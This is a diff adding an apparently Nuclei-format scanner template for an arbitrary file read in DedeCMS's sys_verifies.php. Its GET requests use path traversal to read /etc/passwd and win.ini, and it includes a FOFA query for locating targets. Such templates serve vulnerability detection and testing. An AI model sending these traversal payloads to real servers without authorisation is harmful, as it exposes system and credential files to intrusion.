@@ -1,0 +1,27 @@
+id: dedecms-sysverifies-lfi
+info:
+  name: DeDecms 接口 sys_verifies.php - 任意文件读取漏洞
+  author: leadlife
+  severity: critical
+  description: 需前台注册用户权限操作
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/DeDecms%E6%8E%A5%E5%8F%A3sys_verifies.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: app="DedeCMS"
+  tags: dedecms,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dede/sys_verifies.php?action=view&filename=../../../../../etc/passwd"
+      - "{{BaseURL}}/dede/sys_verifies.php?action=view&filename=../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
